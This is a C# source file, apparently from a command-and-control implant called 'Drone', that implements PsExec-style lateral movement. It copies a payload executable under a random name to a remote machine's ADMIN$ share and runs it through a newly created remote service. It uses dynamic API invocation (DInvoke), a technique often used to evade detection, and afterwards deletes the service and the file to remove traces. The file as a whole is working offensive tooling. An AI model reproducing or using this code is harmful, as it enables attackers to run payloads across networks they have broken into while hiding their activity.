using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

using DInvoke.DynamicInvoke;

using Drone.Utilities;
using Win32 = Drone.Utilities.Win32;

namespace Drone.Commands;

public partial class Jump
{
    private static bool JumpPsexec(string targetMachine, byte[] payload)
    {
        // upload file
        var randName = Helpers.GetRandomString(6);
        var path = @$"\\{targetMachine}\ADMIN$\System32\{randName}.exe";

        // copy file
        File.WriteAllBytes(path, payload);

        // open sc manager
        object[] parameters = { targetMachine, null, Win32.SC_MANAGER_ALL_ACCESS };
        
        var hManager = (IntPtr)Generic.DynamicApiInvoke(
            "advapi32.dll",
            "OpenSCManagerW",
            typeof(Delegates.OpenScManagerW),
            ref parameters);

        if (hManager == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());

        // create service
        parameters = new object[]
        {
            hManager, randName, randName, Win32.SERVICE_ALL_ACCESS, Win32.SERVICE_WIN32_OWN_PROCESS,
            Win32.SERVICE_DEMAND_START, Win32.SERVICE_ERROR_IGNORE, @$"%windir%\System32\{randName}.exe", null, null, null, null, null
        };

        var hService = (IntPtr)Generic.DynamicApiInvoke(
            "advapi32.dll",
            "CreateServiceW",
            typeof(Delegates.CreateServiceW),
            ref parameters);

        if (hService == IntPtr.Zero)
        {
            Win32.CloseServiceHandle(hManager);
            File.Delete(path);
            return false;
        }
        
        // start service
        parameters = new object[] { hService, (uint)0, null };
        Generic.DynamicApiInvoke(
            "advapi32.dll",
            "StartServiceW",
            typeof(Delegates.StartServiceW),
            ref parameters);
        
        // little sleep
        Thread.Sleep(new TimeSpan(0,0,0,10));
        
        // delete service
        parameters = new object[] { hService };
        Generic.DynamicApiInvoke(
            "advapi32.dll",
            "DeleteService",
            typeof(Delegates.DeleteService),
            ref parameters);
        
        // cleanup
        File.Delete(path);
        Win32.CloseServiceHandle(hService);
        Win32.CloseServiceHandle(hManager);

        return true;
    }
}